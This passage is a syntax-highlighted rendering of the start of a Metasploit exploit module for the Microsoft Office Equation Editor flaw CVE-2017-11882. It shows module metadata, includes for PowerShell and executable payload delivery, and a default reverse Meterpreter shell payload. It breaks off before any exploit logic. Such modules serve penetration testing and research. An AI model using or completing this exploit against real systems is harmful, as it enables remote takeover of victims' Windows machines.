</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">145
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">146
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">147
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">148
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">149
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">150
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">151
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">152
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">153
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">154
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">155
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">156
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">157
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">158
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">159
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">160
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">161
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">162
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">163
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">164
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">165
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">166
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">167
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">168
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">169
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">170
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">171
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">172
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">173
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">174
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">175
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">176
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">177
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">178
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">179
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">180
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">181
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">182
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">183
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">184
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">185
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">186
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">187
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">188
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">189
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">190
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">191
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">192
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">193
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">194
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">195
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">196
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">197
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">198
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">199
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">200
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">201
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">202
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">203
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">204
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">205
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">206
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">207
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">208
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">209
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">210
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This module requires Metasploit: https://metasploit.com/download</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Current source: https://github.com/rapid7/metasploit-framework</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MetasploitModule</span> <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>Rank</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>ManualRanking</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HttpServer</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Powershell</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>EXE</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>initialize</span>(info <span style=color:#f92672>=</span> {})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>super</span>(update_info(info,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Name&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;Microsoft Office CVE-2017-11882&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Description&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>%q{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        Module exploits a flaw in the Equation Editor, developed
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        in 2000, that allowed any OLE object to execute in a separate
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        address space. Compared to original PoC, allows for a command within
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        a length of 109 bytes to be executed Affects Microsoft Office word for the latest
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        17 years.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      }</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Author&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;mumbai&#39;</span>, <span style=color:#e6db74>&#39;embedi&#39;</span>, <span style=color:#e6db74>&#39;BlackMathIT&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;License&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>MSF_LICENSE</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DisclosureDate&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;Nov 15 2017&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;References&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;URL&#39;</span>, <span style=color:#e6db74>&#39;https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;URL&#39;</span>, <span style=color:#e6db74>&#39;https://github.com/embedi/CVE-2017-11882&#39;</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;URL&#39;</span>, <span style=color:#e6db74>&#39;https://github.com/BlackMathIT/2017-11882_Generator/blob/master/2017-11882_Generator.py&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Platform&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;win&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Arch&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span><span style=color:#66d9ef>ARCH_X86</span>, <span style=color:#66d9ef>ARCH_X64</span><span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Targets&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;Automatic&#39;</span>, {} <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DefaultTarget&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Payload&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;DisableNops&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DefaultOptions&#39;</span> <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;EXITFUNC&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;thread&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;PAYLOAD&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;windows/x64/meterpreter/reverse_tcp&#39;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    ))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    register_options(<span style=color:#f92672>[</span>
